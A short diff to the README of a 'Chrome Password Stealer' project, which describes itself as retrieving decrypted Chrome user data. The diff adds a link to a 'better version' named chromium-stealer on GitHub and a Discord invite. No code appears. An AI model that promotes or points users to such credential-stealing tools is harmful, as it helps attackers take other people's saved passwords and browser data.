@@ -2,6 +2,9 @@
 
 ## **Chrome Password Stealer project is for retrieving decrypted chrome user data.**
 
+# 🟩🟦 A better version has been dropped! 🟦🟩
+## **Link:** [https://github.com/yurtrimu/chromium-stealer](https://github.com/yurtrimu/chromium-stealer) 
+
 # Questions?
 ### - **I gladly answer your questions on the [discord server](https://discord.gg/QBhFd2aK4r).**
 
